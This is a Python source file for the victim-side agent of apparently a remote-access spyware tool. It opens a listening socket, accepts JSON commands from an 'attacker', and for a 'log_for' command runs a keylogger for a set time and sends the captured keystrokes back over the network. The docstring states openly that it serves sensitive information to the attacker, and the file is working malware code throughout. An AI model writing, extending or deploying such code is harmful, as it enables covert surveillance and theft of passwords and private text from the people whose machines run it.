import socket
import json
import random
import sys
import selectors
import types
from keylogger import KeyLogger

SHELL_ARGUMENTS = sys.argv

# the ip and port shell arguments (but they have default values)
IP = '0.0.0.0' if len(SHELL_ARGUMENTS) < 2 else SHELL_ARGUMENTS[1]  # TODO: modify this
PORT = 5000 if len(SHELL_ARGUMENTS) < 3 else SHELL_ARGUMENTS[2]
SOCK_BYTE_LIMIT = 4096
my_key_logger = KeyLogger()


class Victim:
    """
    This class represents the victim's socket. It is a server, as it serves sensitive information
    to the attacker.
    """

    def __init__(self, ip=IP, port=PORT):
        self._ip = ip
        self._port = port
        self._sel = selectors.DefaultSelector()
        self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sel.register(self._socket, selectors.EVENT_READ, data=None)

    @property
    def ip(self):
        return self._ip

    @property
    def port(self):
        return self._port

    def bind(self):
        self._socket.bind((self._ip, self._port))

    def listen(self):
        self._socket.listen()
        self._socket.setblocking(False)

    def initialize(self):
        """ bind to the ip and port, and then listen for new connections"""
        self.bind()
        self.listen()

    def accept(self, sock):
        conn, addr = sock.accept()  # Should be ready to read
        print(f"Accepted connection from {addr}")
        conn.setblocking(False)
        data = types.SimpleNamespace(addr=addr, inb=b"", outb=b"")  # represents the data that will be read or written
        # when communicating with the client.
        events = selectors.EVENT_READ | selectors.EVENT_WRITE  # we want to know when the sockets are ready
        # for reading or writing
        self._sel.register(conn, events, data=data)

    def send_preparation_message(self, sock, num_of_messages, status='pending'):
        response = json.dumps({
            'status': status,
            'num_of_messages': num_of_messages
        })
        sock.send(response.encode('utf-8'))

    def service_connection(self, key, mask):
        sock = key.fileobj
        data = key.data

        if mask & selectors.EVENT_READ:  # if we can read data from the client
            recv_data = sock.recv(SOCK_BYTE_LIMIT)  # Should be ready to read
            if recv_data.decode('utf-8'):
                data.outb += recv_data
            else:
                print(f"Closing connection to {data.addr}")
                self._sel.unregister(sock)
                sock.close()
        if mask & selectors.EVENT_WRITE:
            string_data = data.outb.decode('utf-8')
            if data.outb.decode('utf-8'):
                # get the proper response for the request
                response = self.process_request(string_data)

                # encode the response to bytes in utf-8
                data.outb = response.encode('utf-8')

                # calculate the number of messages required to send the bytes, considering the byte limit.
                bytes_to_send = len(data.outb)
                number_of_responses = bytes_to_send // SOCK_BYTE_LIMIT
                if bytes_to_send % SOCK_BYTE_LIMIT != 0:
                    number_of_responses += 1
                print(f"bytes: {bytes_to_send}, messages: {number_of_responses}")
                if number_of_responses >= 1:
                    self.send_preparation_message(sock, number_of_responses, status='pending')
                while bytes_to_send >= SOCK_BYTE_LIMIT:
                    bytes_to_send -= SOCK_BYTE_LIMIT
                    sent = sock.send(data.outb[:SOCK_BYTE_LIMIT])  # Should be ready to write
                    print(f"sent {sent} bytes")
                    data.outb = data.outb[sent:]
                if bytes_to_send > 0:
                    sent = sock.send(data.outb)  # Should be ready to write
                    print(f"sent the last {sent} bytes")
                    data.outb = b''

    def _throw_error(self):
        return json.dumps({'status': 'failure', 'info': 'Invalid request'})

    def process_request(self, request: str):
        try:
            request_dict = json.loads(request)
        except json.JSONDecodeError:
            return self._throw_error()

        if request_dict['type'] == 'request':
            if request_dict['resource'] == 'screenshot':
                print("taking a screenshot")
                return json.dumps({'status': 'success'})
        elif request_dict['type'] == 'action':
            if request_dict['action'] == 'start_keylogging':
                print("starting keylogging")
                return json.dumps({'status': 'success'})
            elif request_dict['action'] == 'log_for':
                seconds = request_dict['duration']
                print(f"logging for {seconds} seconds .. ")
                my_key_logger.log_keys_for(seconds)
                return json.dumps(
                    {'status': 'success', 'events': my_key_logger.to_dicts(), 'string': my_key_logger.get_string_log()})
            else:
                return self._throw_error()
        else:
            return self._throw_error()

    def run(self):
        try:
            while True:
                events = self._sel.select(timeout=None)
                for key, mask in events:
                    if key.data is None:
                        self.accept(key.fileobj)
                    else:
                        self.service_connection(key, mask)
        except KeyboardInterrupt:
            print("Caught keyboard interrupt, exiting")
        finally:
            self._sel.close()


def main():
    victim_server = Victim()
    victim_server.bind()
    print("binded server!")
    print("server is listening....")
    victim_server.listen()
    victim_server.run()


if __name__ == '__main__':
    main()
